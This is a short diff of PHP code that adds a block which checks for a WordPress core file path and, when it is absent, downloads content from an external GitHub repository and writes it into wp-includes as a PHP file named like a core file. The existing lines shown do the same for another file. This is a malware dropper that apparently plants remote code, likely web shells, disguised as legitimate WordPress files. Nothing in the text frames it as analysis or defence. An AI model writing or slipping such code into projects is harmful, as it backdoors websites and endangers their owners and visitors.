@@ -414,9 +414,20 @@ $hook556 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/feed-
 $hook55 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/feed-rss2-comments.php" ; 
 if (file_put_contents ($hook55, $hook556));
 
+} 
+/**/
+/**/
+$kupa557 = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-ajax-response.php";
+if (file_exists($kupa557)) { 
+ }
+else { 
+echo('cekti');
+$hook557 = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/class-wp-ajax-response.txt');
+$hook555 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/class-wp-ajax-response.php" ; 
+if (file_put_contents ($hook555, $hook557));
+
 } }
 /**/
-
 
 ?>
 <?php
